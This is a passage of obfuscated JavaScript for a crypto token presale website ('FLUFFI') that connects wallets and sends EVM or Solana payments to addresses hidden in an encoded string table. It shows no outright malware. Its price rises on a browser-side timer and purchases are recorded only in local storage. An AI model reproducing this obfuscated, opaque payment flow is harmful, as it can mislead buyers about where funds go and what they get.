_0x34f714=_0x24293b;_0x27155a?handleWalletConnection(_0x27155a[_0x34f714(0x2d0)]()):disconnectWallet();});}catch(_0x2bd3d7){console['error'](_0x24293b(0x2a8),_0x2bd3d7),showNotification(_0x24293b(0x2a9)+_0x2bd3d7[_0x24293b(0xc5)],_0x24293b(0x1dd));}}function isMobile(){return/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i['test'](navigator['userAgent']);}function handleWalletConnection(_0x407a63){const _0x5aed2a=_0x1bf7bf;userWalletAddress=_0x407a63;const _0x387570=document['getElementById'](_0x5aed2a(0x163)),_0x2de02d=_0x407a63[_0x5aed2a(0x285)](0x0,0x6)+_0x5aed2a(0x19b)+_0x407a63[_0x5aed2a(0x285)](-0x4);_0x387570['innerHTML']='\x0a\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-address-display\x22>'+_0x2de02d+_0x5aed2a(0x97),document['getElementById'](_0x5aed2a(0x2e5))[_0x5aed2a(0x258)]=_0x407a63;const _0x57afc7=_0x5aed2a(0x23b)+_0x407a63;document[_0x5aed2a(0x26f)]('referralLink')[_0x5aed2a(0x258)]=_0x57afc7,localStorage[_0x5aed2a(0x91)](_0x5aed2a(0x2dd),_0x5aed2a(0xf1)),localStorage[_0x5aed2a(0x91)]('walletAddress',_0x407a63);const _0x1791e8=document[_0x5aed2a(0x26f)]('userPresale');if(_0x1791e8){const _0x1974e1=parseFloat(localStorage[_0x5aed2a(0x297)](_0x5aed2a(0x2ae)+_0x407a63)||'0');_0x1974e1>0x0&&(_0x1791e8['textContent']=_0x1974e1[_0x5aed2a(0xc8)](undefined,{'maximumFractionDigits':0x2}),setTimeout(()=>{const _0xe59333=_0x5aed2a;document[_0xe59333(0x26f)](_0xe59333(0xad))[_0xe59333(0x223)]({'behavior':_0xe59333(0x1e9),'block':'center'});},0x3e8));}closeWalletConnectModal(),showNotification('Wallet\x20connected\x20successfully!','success');}async function disconnectWallet(){const _0xdf6dfa=_0x1bf7bf;userWalletAddress=null,isSolanaWallet=![],solanaProvider=null;const _0x3a6b31=document[_0xdf6dfa(0x26f)](_0xdf6dfa(0x163));_0x3a6b31[_0xdf6dfa(0x209)]='\x0a\x20\x20\x20\x20\x20\x20<button\x20id=\x22walletButton\x22\x20onclick=\x22openWalletModal()\x22\x20\x0a\x20\x20\x20\x20\x20\x20class=\x22bg-green-700\x20hover:bg-green-800\x20text-white\x20py-1\x20px-3\x20rounded\x20flex\x20items-center\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-wallet\x20mr-2\x22></i>Connect\x20Wallet\x0a\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20',document['getElementById'](_0xdf6dfa(0x2e5))[_0xdf6dfa(0x258)]='',localStorage[_0xdf6dfa(0x82)]('walletConnected'),localStorage[_0xdf6dfa(0x82)](_0xdf6dfa(0x2e5)),provider=null,showNotification(_0xdf6dfa(0x29b),_0xdf6dfa(0x2fc));}function showNotification(_0x2b6fb4,_0x514146=_0x1bf7bf(0x282)){const _0x133ebc=_0x1bf7bf,_0x26499b=document['querySelectorAll'](_0x133ebc(0x247));_0x26499b[_0x133ebc(0x2f7)](_0x48b5cf=>_0x48b5cf['remove']());const _0x531ded=document[_0x133ebc(0x2c9)](_0x133ebc(0x1da));_0x531ded['className']=_0x133ebc(0x174);const _0x37d582={'success':_0x133ebc(0x11d),'error':_0x133ebc(0x1a6),'warning':_0x133ebc(0x12e),'info':_0x133ebc(0x2b3)},_0x32279d={'success':'✅','error':'❌','warning':'⚠️','info':'ℹ️'};_0x531ded[_0x133ebc(0x209)]=_0x133ebc(0x26d)+_0x37d582[_0x514146]+_0x133ebc(0x1fc)+_0x32279d[_0x514146]+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22flex-1\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22font-semibold\x22>'+(_0x514146[_0x133ebc(0x2f0)](0x0)[_0x133ebc(0xbc)]()+_0x514146[_0x133ebc(0x285)](0x1))+_0x133ebc(0x22f)+_0x2b6fb4+_0x133ebc(0x98),document[_0x133ebc(0x256)][_0x133ebc(0x14f)](_0x531ded),setTimeout(()=>{const _0x36d19a=_0x133ebc;_0x531ded&&_0x531ded['parentNode']&&(_0x531ded[_0x36d19a(0x192)][_0x36d19a(0xd5)]('animate-slide-out'),setTimeout(()=>_0x531ded[_0x36d19a(0xaa)](),0x12c));},0x1388);}const notificationStyles=_0x1bf7bf(0x2e2);if(!document['getElementById'](_0x1bf7bf(0x12f))){const styleSheet=document['createElement']('style');styleSheet['id']=_0x1bf7bf(0x12f),styleSheet[_0x1bf7bf(0x2db)]=notificationStyles,document[_0x1bf7bf(0xdf)]['appendChild'](styleSheet);}const rateLimiter={'attempts':{},'canAttempt'(_0x5b0b45,_0x433d01,_0x44a20e=0x5,_0x50fa49=0xea60){const _0x53b435=_0x1bf7bf,_0x2495a3=_0x5b0b45+'_'+_0x433d01,_0x27d6b6=Date['now']();if(!this['attempts'][_0x2495a3])this[_0x53b435(0x1b5)][_0x2495a3]=[];this[_0x53b435(0x1b5)][_0x2495a3]=this[_0x53b435(0x1b5)][_0x2495a3]['filter'](_0x3180dc=>_0x27d6b6-_0x3180dc<_0x50fa49);if(this[_0x53b435(0x1b5)][_0x2495a3][_0x53b435(0x185)]>=_0x44a20e)return![];return this[_0x53b435(0x1b5)][_0x2495a3]['push'](_0x27d6b6),!![];}};async function recordPurchase(_0x119c11,_0x45cc15,_0x164c9f){const _0x5a2cc7=_0x1bf7bf,_0x446314=await fetch(_0x5a2cc7(0x250),{'method':_0x5a2cc7(0x101),'headers':{'Content-Type':_0x5a2cc7(0x1a8)},'body':JSON['stringify']({'wallet':userWalletAddress,'txHash':_0x119c11,'amount':_0x45cc15,'tokens':_0x164c9f,'timestamp':Date[_0x5a2cc7(0x1fb)]()})});if(!_0x446314['ok'])throw new Error(_0x5a2cc7(0x93));}async function switchToNetwork(_0x5ccd40=_0x1bf7bf(0xab)){const _0x3703a5=_0x1bf7bf;if(!window['ethereum'])return;const _0x33502b={'BSC':{'chainId':'0x38','rpcUrl':_0x3703a5(0x1b3),'name':_0x3703a5(0x99),'nativeCurrency':{'name':'BNB','symbol':_0x3703a5(0x138),'decimals':0x12},'blockExplorerUrl':_0x3703a5(0x289)},'BSC_TEST':{'chainId':_0x3703a5(0x2a0),'rpcUrl':_0x3703a5(0x24f),'name':_0x3703a5(0x1ba),'nativeCurrency':{'name':_0x3703a5(0x138),'symbol':_0x3703a5(0x138),'decimals':0x12},'blockExplorerUrl':_0x3703a5(0x117)},'ETH':{'chainId':'0x1','rpcUrl':_0x3703a5(0x188),'name':_0x3703a5(0x2be),'nativeCurrency':{'name':_0x3703a5(0x195),'symbol':_0x3703a5(0x195),'decimals':0x12},'blockExplorerUrl':'https://etherscan.io'},'ETH_SEPOLIA':{'chainId':_0x3703a5(0x292),'chainName':_0x3703a5(0x1cc),'nativeCurrency':{'name':_0x3703a5(0x195),'symbol':'ETH','decimals':0x12},'rpcUrls':[_0x3703a5(0x2b1)],'blockExplorerUrls':[_0x3703a5(0x302)]},'POLYGON':{'chainId':_0x3703a5(0xae),'rpcUrl':_0x3703a5(0x10f),'name':_0x3703a5(0x13e),'nativeCurrency':{'name':_0x3703a5(0x14d),'symbol':_0x3703a5(0x14d),'decimals':0x12},'blockExplorerUrl':_0x3703a5(0x15c)},'POLYGON_AMOY':{'name':'Polygon\x20Amoy\x20Testnet','chainId':0x13882,'rpcUrl':_0x3703a5(0x18d),'explorer':_0x3703a5(0xd9),'currency':_0x3703a5(0x1cf)},'AVAX':{'chainId':'0xA86A','rpcUrl':'https://api.avax.network/ext/bc/C/rpc','name':_0x3703a5(0x1c8),'nativeCurrency':{'name':_0x3703a5(0x125),'symbol':_0x3703a5(0x125),'decimals':0x12},'blockExplorerUrl':'https://snowtrace.io'},'AVAX_FUJI':{'chainId':_0x3703a5(0x2a6),'rpcUrl':'https://api.avax-test.network/ext/bc/C/rpc','name':'Avalanche\x20Fuji\x20Testnet','nativeCurrency':{'name':_0x3703a5(0x125),'symbol':_0x3703a5(0x125),'decimals':0x12},'blockExplorerUrl':_0x3703a5(0x16e)}},_0x44b447=_0x33502b[_0x5ccd40];if(!_0x44b447){console[_0x3703a5(0x1dd)](_0x3703a5(0x1d6),_0x5ccd40);return;}try{await window[_0x3703a5(0xa2)][_0x3703a5(0x90)]({'method':_0x3703a5(0x27d),'params':[{'chainId':_0x44b447[_0x3703a5(0x11e)]}]});}catch(_0x27e747){if(_0x27e747[_0x3703a5(0xb6)]===0x1326)try{await window[_0x3703a5(0xa2)][_0x3703a5(0x90)]({'method':'wallet_addEthereumChain','params':[{'chainId':_0x44b447[_0x3703a5(0x11e)],'chainName':_0x44b447['name'],'rpcUrls':[_0x44b447[_0x3703a5(0x220)]],'nativeCurrency':_0x44b447[_0x3703a5(0x7a)],'blockExplorerUrls':[_0x44b447[_0x3703a5(0x164)]]}]});}catch(_0x1207e0){console[_0x3703a5(0x1dd)]('Error\x20adding\x20network:',_0x1207e0);throw new Error(_0x3703a5(0x1bb)+_0x44b447[_0x3703a5(0x19a)]+_0x3703a5(0x2e1));}else{console[_0x3703a5(0x1dd)](_0x3703a5(0x1e3),_0x27e747);throw new Error(_0x3703a5(0x18e)+_0x44b447['name']);}}}async function validateContracts(){const _0x5f2366=_0x1bf7bf;if(!window[_0x5f2366(0xa2)])throw new Error(_0x5f2366(0xbb));const _0x530097=new ethers[(_0x5f2366(0x280))]['Web3Provider'](window[_0x5f2366(0xa2)]),{chainId:_0xfff936}=await _0x530097['getNetwork'](),_0x267d37=CONTRACT_ADDRESSES[_0xfff936];if(!_0x267d37||_0x267d37===_0x5f2366(0x235))throw new Error(_0x5f2366(0x2da)+_0xfff936+')');const _0x113f73=await _0x530097[_0x5f2366(0x180)](_0x267d37);if(_0x113f73==='0x')throw new Error(_0x5f2366(0x293));return console[_0x5f2366(0x1c9)]('Contract\x20validation\x20passed\x20✅'),!![];}function getCurrentFluffiPrice(){const _0x3be632=_0x1bf7bf;let _0x3d70c7=localStorage[_0x3be632(0x297)](_0x3be632(0x272));!_0x3d70c7?_0x3d70c7=new Date(_0x3be632(0x2ea))[_0x3be632(0x155)]():_0x3d70c7=parseInt(_0x3d70c7);const _0x478aeb=Date['now'](),_0x50e712=_0x478aeb-_0x3d70c7,_0x6f0887=0x30*0x3c*0x3c*0x3e8,_0x898056=Math[_0x3be632(0x284)](Math[_0x3be632(0x28f)](_0x50e712/_0x6f0887),0xe),_0x586cc0=0.0001*Math[_0x3be632(0x13c)](1.05,_0x898056);return _0x586cc0;}async function getCryptoPriceInUSD(_0x245ac4){const _0x465b9d=_0x1bf7bf;try{const _0xc96667='price_'+_0x245ac4,_0x13e7e6=localStorage['getItem'](_0xc96667),_0x712a69=Date[_0x465b9d(0x1fb)]();if(_0x13e7e6){const {price:_0x279317,timestamp:_0xa21c75}=JSON[_0x465b9d(0x25d)](_0x13e7e6);if(_0x712a69-_0xa21c75<0x7530)return console['log'](_0x465b9d(0x178)+_0x245ac4+_0x465b9d(0x1cb)+_0x279317),_0x279317;}if(_0x245ac4===_0x465b9d(0xb3)||_0x245ac4==='USDC')return 0x1;const _0x3c7ca6={'BNB':_0x465b9d(0x24c),'ETH':_0x465b9d(0x213),'SOL':'SOLUSDT','AVAX':_0x465b9d(0x136),'MATIC':_0x465b9d(0x23e)},_0x29c779=_0x3c7ca6[_0x245ac4];if(!_0x29c779)throw new Error('Unsupported\x20currency:\x20'+_0x245ac4);const _0x4bba51=await fetch(_0x465b9d(0x266)+_0x29c779);if(!_0x4bba51['ok'])throw new Error('Failed\x20to\x20fetch\x20crypto\x20price\x20from\x20Binance');const _0x1cf8a3=await _0x4bba51[_0x465b9d(0x7b)](),_0x3af226=parseFloat(_0x1cf8a3[_0x465b9d(0x13a)]);if(!_0x3af226)throw new Error(_0x465b9d(0x210)+_0x245ac4);return localStorage['setItem'](_0xc96667,JSON[_0x465b9d(0x263)]({'price':_0x3af226,'timestamp':_0x712a69})),console[_0x465b9d(0x1c9)]('Fetched\x20'+_0x245ac4+_0x465b9d(0x1cb)+_0x3af226),_0x3af226;}catch(_0x2bfc0f){console[_0x465b9d(0x1dd)](_0x465b9d(0x2c5),_0x2bfc0f);const _0x9af4ab={'BNB':0x465,'ETH':0xfd2,'SOL':0xc6,'AVAX':20.5,'MATIC':0.2,'USDC':0x1,'USD':0x1};return console[_0x465b9d(0x156)](_0x465b9d(0x1a9)+_0x245ac4+':\x20$'+_0x9af4ab[_0x245ac4]),showNotification(_0x465b9d(0x119),_0x465b9d(0x78)),_0x9af4ab[_0x245ac4]||0x1;}}async function buyFluffi(){const _0x37a2d0=_0x1bf7bf;if(!rateLimiter['canAttempt'](_0x37a2d0(0x18a),userWalletAddress)){showNotification(_0x37a2d0(0x208),_0x37a2d0(0x78));return;}const _0x1679fe=document['getElementById'](_0x37a2d0(0x29a))['value'],_0x5c7ef4=document[_0x37a2d0(0x26f)](_0x37a2d0(0x141))[_0x37a2d0(0x258)],_0x4a4dd7=document['getElementById']('refInput')['value'];if(!userWalletAddress){showNotification(_0x37a2d0(0x169),_0x37a2d0(0x1dd)),openWalletModal();return;}if(!_0x1679fe||isNaN(_0x1679fe)||Number(_0x1679fe)<=0x0){showNotification(_0x37a2d0(0xa0),_0x37a2d0(0x1dd));return;}const [_0x21c9ea,_0x1a6e39]=parseChainCurrency(_0x5c7ef4);if(!_0x21c9ea||!_0x1a6e39){showNotification(_0x37a2d0(0x1a0),_0x37a2d0(0x1dd));return;}const _0xa39fff=document['querySelector'](_0x37a2d0(0x14b)),_0x249b8e=_0xa39fff[_0x37a2d0(0x2db)];_0xa39fff[_0x37a2d0(0x2db)]=_0x37a2d0(0x2d5),_0xa39fff[_0x37a2d0(0x2f8)]=!![];try{if(_0x21c9ea===_0x37a2d0(0x122)){showNotification(_0x37a2d0(0x206),_0x37a2d0(0x282)),_0xa39fff[_0x37a2d0(0x2db)]=_0x249b8e,_0xa39fff[_0x37a2d0(0x2f8)]=![];return;}_0x21c9ea['includes'](_0x37a2d0(0xc3))?await buyWithSolana(_0x1679fe,_0x1a6e39,_0x4a4dd7):(await ensureCorrectNetwork(_0x21c9ea),await buyWithEVM(_0x1679fe,_0x1a6e39,_0x4a4dd7,_0x21c9ea));}catch(_0xbab8c5){console[_0x37a2d0(0x1dd)](_0x37a2d0(0x304),_0xbab8c5),_0xa39fff[_0x37a2d0(0x2db)]=_0x249b8e,_0xa39fff[_0x37a2d0(0x2f8)]=![],showNotification(_0xbab8c5[_0x37a2d0(0xc5)]||_0x37a2d0(0x287),'error');}}function parseChainCurrency(_0x3192f0){const _0x152c2f=_0x1bf7bf,_0x4af194=_0x3192f0[_0x152c2f(0x298)]('-');if(_0x4af194[_0x152c2f(0x185)]<0x2)return[null,null];const _0x417e52=_0x4af194[_0x4af194[_0x152c2f(0x185)]-0x1],_0x27a87c=_0x4af194[_0x152c2f(0x285)](0x0,-0x1)[_0x152c2f(0x190)]('-');return[_0x27a87c,_0x417e52];}async function ensureCorrectNetwork(_0x1b331f){const _0x4e1c0e=_0x1bf7bf;if(!window[_0x4e1c0e(0xa2)])throw new Error(_0x4e1c0e(0x104));try{const _0x3e62f4=new ethers[(_0x4e1c0e(0x280))][(_0x4e1c0e(0x271))](window[_0x4e1c0e(0xa2)]),_0x4c084f=await _0x3e62f4['getNetwork'](),_0x5c9274=_0x4c084f[_0x4e1c0e(0x11e)][_0x4e1c0e(0x2d0)]();_0x5c9274!==_0x1b331f&&(showNotification(_0x4e1c0e(0xd6)+(NETWORKS[_0x1b331f]?.[_0x4e1c0e(0x2a2)]||_0x4e1c0e(0x1ce))+_0x4e1c0e(0x19b),_0x4e1c0e(0x282)),await switchNetwork(_0x1b331f),await new Promise(_0xe186c6=>setTimeout(_0xe186c6,0x3e8)));}catch(_0x3bbfe4){console['error'](_0x4e1c0e(0x2bc),_0x3bbfe4);throw new Error('Failed\x20to\x20switch\x20network.\x20Please\x20switch\x20manually\x20in\x20your\x20wallet.');}}async function buyWithEVM(_0x1f2931,_0x12efb3,_0x2ed401,_0x45624b){const _0x348a3b=_0x1bf7bf;try{const _0x5a9099=new ethers['providers'][(_0x348a3b(0x271))](window[_0x348a3b(0xa2)]),_0x130120=_0x5a9099[_0x348a3b(0x27b)](),_0x1d21d8=await _0x5a9099['getNetwork'](),_0x4fd15b=_0x1d21d8[_0x348a3b(0x11e)]['toString']();if(_0x4fd15b!==_0x45624b)throw new Error(_0x348a3b(0x2ff));if(!NETWORKS[_0x45624b])throw new Error(_0x348a3b(0x20a));const _0x28233e=getCurrentFluffiPrice();console['log'](_0x348a3b(0x2b5)+_0x28233e);const _0x298579=await getCryptoPriceInUSD(_0x12efb3);console[_0x348a3b(0x1c9)](_0x12efb3+_0x348a3b(0x1cb)+_0x298579);const _0x5bed50=Number(_0x1f2931)*_0x298579;console[_0x348a3b(0x1c9)](_0x348a3b(0x2c3)+_0x5bed50);const _0x4d09d6=_0x5bed50/_0x28233e;console[_0x348a3b(0x1c9)](_0x348a3b(0x144)+_0x4d09d6),showNotification(_0x348a3b(0x2ed)+_0x28233e[_0x348a3b(0x1c3)](0x6)+_0x348a3b(0xc7),_0x348a3b(0x282)),showNotification(_0x12efb3+'\x20price:\x20$'+_0x298579[_0x348a3b(0x1c3)](0x2),_0x348a3b(0x282)),showNotification(_0x348a3b(0x294)+_0x4d09d6[_0x348a3b(0xc8)](undefined,{'maximumFractionDigits':0x2})+_0x348a3b(0x254),_0x348a3b(0x282));const _0x1aa86d=NETWORKS[_0x45624b],_0xdeaf5=_0x1aa86d['nativeCurrency'][_0x348a3b(0x17a)];let _0x5e9e36;if(_0x12efb3===_0xdeaf5)_0x5e9e36=Number(_0x1f2931),console[_0x348a3b(0x1c9)](_0x348a3b(0x215)+_0x1f2931+'\x20'+_0xdeaf5+_0x348a3b(0x115));else{const _0x26a1ac=await getCryptoPriceInUSD(_0xdeaf5);_0x5e9e36=_0x5bed50/_0x26a1ac,console[_0x348a3b(0x1c9)]('Converting\x20'+_0x1f2931+'\x20'+_0x12efb3+'\x20($'+_0x5bed50+_0x348a3b(0xfc)+_0x5e9e36+'\x20'+_0xdeaf5),showNotification(_0x348a3b(0x274)+_0x1f2931+'\x20'+_0x12efb3+_0x348a3b(0x1ca)+_0x5bed50[_0x348a3b(0x1c3)](0x2)+')\x20to\x20'+_0x5e9e36['toFixed'](0x6)+'\x20'+_0xdeaf5,_0x348a3b(0x282));}_0x5e9e36=parseFloat(_0x5e9e36['toFixed'](0x12)),console[_0x348a3b(0x1c9)]('Native\x20amount\x20(18\x20decimals):\x20'+_0x5e9e36);let _0x12b6ad=ethers['constants'][_0x348a3b(0x2d9)];if(_0x2ed401){if(!ethers[_0x348a3b(0xfd)]['isAddress'](_0x2ed401))throw new Error(_0x348a3b(0x26c));_0x12b6ad=_0x2ed401;}const _0x22577f=CONTRACT_ADDRESSES[_0x1d21d8[_0x348a3b(0x11e)]];if(!_0x22577f||_0x22577f===_0x348a3b(0x235)||_0x22577f[_0x348a3b(0x21a)](_0x348a3b(0x19b)))throw new Error(_0x348a3b(0x2da)+_0x1d21d8[_0x348a3b(0x11e)]+').');const _0x3c84df=new ethers[(_0x348a3b(0x1f8))](_0x22577f,FLUFFI_CONTRACT_ABI,_0x130120);let _0x480020;try{_0x480020=ethers['utils'][_0x348a3b(0x1cd)](_0x5e9e36[_0x348a3b(0x2d0)]());}catch(_0x54b9b5){console['error'](_0x348a3b(0x199),_0x54b9b5),_0x480020=ethers['BigNumber'][_0x348a3b(0x270)](Math[_0x348a3b(0x28f)](_0x5e9e36*0xde0b6b3a7640000)['toString']());}console[_0x348a3b(0x1c9)](_0x348a3b(0x1f5)+_0x5e9e36+'\x20'+_0xdeaf5+'\x20to\x20contract');const _0x406aa9=await _0x3c84df[_0x348a3b(0x244)][_0x348a3b(0x26a)](_0x12b6ad,{'value':_0x480020}),_0x4a9773=await _0x3c84df[_0x348a3b(0x26a)](_0x12b6ad,{'value':_0x480020,'gasLimit':_0x406aa9['mul'](0x78)['div'](0x64)});showNotification(_0x348a3b(0x162),_0x348a3b(0x282)),await _0x4a9773['wait']();const _0x31c5aa=document[_0x348a3b(0x26f)](_0x348a3b(0x16c)),_0x2eead7=parseFloat(_0x31c5aa[_0x348a3b(0x2db)][_0x348a3b(0x236)](/,/g,''))||0x0;_0x31c5aa[_0x348a3b(0x2db)]=(_0x2eead7+_0x4d09d6)['toLocaleString']();const _0x169cd5=document['getElementById'](_0x348a3b(0xad));if(_0x169cd5){const _0x22493d=parseFloat(localStorage['getItem'](_0x348a3b(0x2ae)+userWalletAddress)||'0'),_0x1f5552=_0x22493d+_0x4d09d6;localStorage[_0x348a3b(0x91)](_0x348a3b(0x2ae)+userWalletAddress,_0x1f5552['toString']()),_0x169cd5[_0x348a3b(0x2db)]=_0x1f5552[_0x348a3b(0xc8)](undefined,{'maximumFractionDigits':0x2});}const _0xcc0824=parseFloat(localStorage['getItem'](_0x348a3b(0x2ae)+userWalletAddress)||'0'),_0x216ca9=_0xcc0824[_0x348a3b(0xc8)](undefined,{'maximumFractionDigits':0x2}),_0xa643bd=document[_0x348a3b(0x2c9)](_0x348a3b(0x1da));_0xa643bd[_0x348a3b(0x15f)]='fixed\x20top-1/2\x20left-1/2\x20transform\x20-translate-x-1/2\x20-translate-y-1/2\x20z-50\x20bg-white\x20dark:bg-gray-800\x20p-8\x20rounded-2xl\x20shadow-2xl\x20max-w-md\x20w-full\x20border-4\x20border-green-500',_0xa643bd['innerHTML']=_0x348a3b(0x21e)+_0x4d09d6['toLocaleString'](undefined,{'maximumFractionDigits':0x2})+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-lg\x20font-semibold\x20text-gray-800\x20dark:text-white\x20mt-1\x22>FLUFFI\x20Tokens</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22space-y-2\x20text-left\x20mb-6\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22flex\x20justify-between\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22text-gray-600\x20dark:text-gray-300\x22>Amount\x20Paid:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22font-bold\x22>'+_0x1f2931+'\x20'+_0x12efb3+_0x348a3b(0x9b)+_0x28233e['toFixed'](0x6)+_0x348a3b(0xe3)+_0x216ca9+_0x348a3b(0x17c),document[_0x348a3b(0x256)][_0x348a3b(0x14f)](_0xa643bd),setTimeout(()=>{const _0x350aeb=_0x348a3b;_0xa643bd&&_0xa643bd['parentNode']&&_0xa643bd[_0x350aeb(0xaa)]();},0x2710),showNotification(_0x348a3b(0x11c)+_0x4d09d6[_0x348a3b(0xc8)](undefined,{'maximumFractionDigits':0x2})+_0x348a3b(0xc9),'success');const _0x348259=document[_0x348a3b(0x238)]('button[onclick=\x22buyFluffi()\x22]');_0x348259[_0x348a3b(0x2db)]='🚀\x20Buy\x20Now',_0x348259[_0x348a3b(0x2f8)]=![];}catch(_0x581ed8){console[_0x348a3b(0x1dd)]('EVM\x20purchase\x20error:',_0x581ed8);const _0x4122a9=document[_0x348a3b(0x238)](_0x348a3b(0x14b));_0x4122a9[_0x348a3b(0x2db)]=_0x348a3b(0x143),_0x4122a9['disabled']=![];throw _0x581ed8;}}async function buyWithSolana(_0x1d7d65,_0x58728a,_0x1aec91){const _0x198c4c=_0x1bf7bf;try{if(!solanaProvider||!solanaConnection){if(window['solana']&&window[_0x198c4c(0xc3)][_0x198c4c(0x1a3)])solanaProvider=window[_0x198c4c(0xc3)],initSolanaConnection();else throw new Error(_0x198c4c(0x13f));}const _0x368595=getCurrentFluffiPrice(),_0x503a31=await getCryptoPriceInUSD(_0x58728a),_0x239edf=Number(_0x1d7d65)*_0x503a31,_0x4cafa4=_0x239edf/_0x368595;showNotification(_0x198c4c(0x294)+_0x4cafa4[_0x198c4c(0xc8)](undefined,{'maximumFractionDigits':0x2})+_0x198c4c(0x254),_0x198c4c(0x282));let _0x27761d;if(_0x58728a===_0x198c4c(0x18f))_0x27761d=Number(_0x1d7d65);else{const _0x5aec2d=await getCryptoPriceInUSD('SOL');_0x27761d=_0x239edf/_0x5aec2d,showNotification(_0x198c4c(0x228)+_0x27761d['toFixed'](0x6)+_0x198c4c(0x1bd),_0x198c4c(0x282));}const _0x12a6e5=new solanaWeb3[(_0x198c4c(0x2ec))](userWalletAddress),_0x43eeb5=new solanaWeb3['PublicKey'](_0x198c4c(0x245)),_0x26412d=new solanaWeb3[(_0x198c4c(0x200))]();_0x26412d[_0x198c4c(0x13d)]=_0x12a6e5;const {blockhash:_0x24c22a}=await solanaConnection[_0x198c4c(0x255)]();_0x26412d['recentBlockhash']=_0x24c22a;const _0x33c517=Math['floor'](solanaWeb3[_0x198c4c(0x268)]*_0x27761d),_0x32de93=solanaWeb3[_0x198c4c(0x196)][_0x198c4c(0x1d5)]({'fromPubkey':_0x12a6e5,'toPubkey':_0x43eeb5,'lamports':_0x33c517});_0x26412d[_0x198c4c(0xd5)](_0x32de93),showNotification(_0x198c4c(0x1a1),_0x198c4c(0x282));const {signature:_0xb6f4bf}=await solanaProvider[_0x198c4c(0x1f2)](_0x26412d);await solanaConnection[_0x198c4c(0x279)](_0xb6f4bf,_0x198c4c(0x1be));const _0x299282=document[_0x198c4c(0x26f)](_0x198c4c(0x16c)),_0xf1a9d4=parseFloat(_0x299282[_0x198c4c(0x2db)][_0x198c4c(0x236)](/,/g,''))||0x0;_0x299282[_0x198c4c(0x2db)]=(_0xf1a9d4+_0x4cafa4)['toLocaleString']();const _0x350235=document[_0x198c4c(0x26f)](_0x198c4c(0xad));if(_0x350235){const _0x6b3150=parseFloat(localStorage[_0x198c4c(0x297)](_0x198c4c(0x2ae)+userWalletAddress)||'0'),_0xcd7ff0=_0x6b3150+_0x4cafa4;localStorage[_0x198c4c(0x91)](_0x198c4c(0x2ae)+userWalletAddress,_0xcd7ff0[_0x198c4c(0x2d0)]()),_0x350235['textContent']=_0xcd7ff0[_0x198c4c(0xc8)](undefined,{'maximumFractionDigits':0x2});}const _0x44ee6f=parseFloat(localStorage[_0x198c4c(0x297)](_0x198c4c(0x2ae)+userWalletAddress)||'0'),_0x5d54d0=_0x44ee6f+_0x4cafa4,_0xbaf950=_0x5d54d0[_0x198c4c(0xc8)](undefined,{'maximumFractionDigits':0x2}),_0x180950=document[_0x198c4c(0x2c9)](_0x198c4c(0x1da));_0x180950[_0x198c4c(0x15f)]=_0x198c4c(0x204),_0x180950['innerHTML']='\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-center\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-6xl\x20mb-4\x22>🎉</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20class=\x22text-3xl\x20font-bold\x20text-green-600\x20dark:text-green-400\x20mb-4\x22>Purchase\x20Successful!</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bg-green-50\x20dark:bg-green-900/20\x20p-6\x20rounded-xl\x20mb-6\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-sm\x20text-gray-600\x20dark:text-gray-300\x20mb-2\x22>You\x20bought</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-4xl\x20font-bold\x20text-green-600\x20dark:text-green-400\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x4cafa4['toLocaleString'](undefined,{'maximumFractionDigits':0x2})+_0x198c4c(0x16d)+_0x1d7d65+'\x20'+_0x58728a+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22flex\x20justify-between\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22text-gray-600\x20dark:text-gray-300\x22>Transaction:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22font-bold\x20text-xs\x22>'+_0xb6f4bf['substring'](0x0,0x8)+'...'+_0xb6f4bf[_0x198c4c(0x23c)](_0xb6f4bf[_0x198c4c(0x185)]-0x8)+_0x198c4c(0xe3)+_0xbaf950+_0x198c4c(0x17c),document['body']['appendChild'](_0x180950),setTimeout(()=>{const _0x174ad7=_0x198c4c;_0x180950&&_0x180950[_0x174ad7(0x278)]&&_0x180950[_0x174ad7(0xaa)]();},0x2710),showNotification(_0x198c4c(0x2c1)+_0xb6f4bf,_0x198c4c(0x2fc));const _0x26b416=document[_0x198c4c(0x238)](_0x198c4c(0x14b));_0x26b416[_0x198c4c(0x2db)]=_0x198c4c(0x143),_0x26b416[_0x198c4c(0x2f8)]=![];}catch(_0x3809a8){console[_0x198c4c(0x1dd)](_0x198c4c(0x14a),_0x3809a8);const _0x348022=document[_0x198c4c(0x238)]('button[onclick=\x22buyFluffi()\x22]');_0x348022[_0x198c4c(0x2db)]=_0x198c4c(0x143),_0x348022[_0x198c4c(0x2f8)]=![];throw new Error(_0x198c4c(0x21b)+_0x3809a8[_0x198c4c(0xc5)]);}}function _0x7557(){const 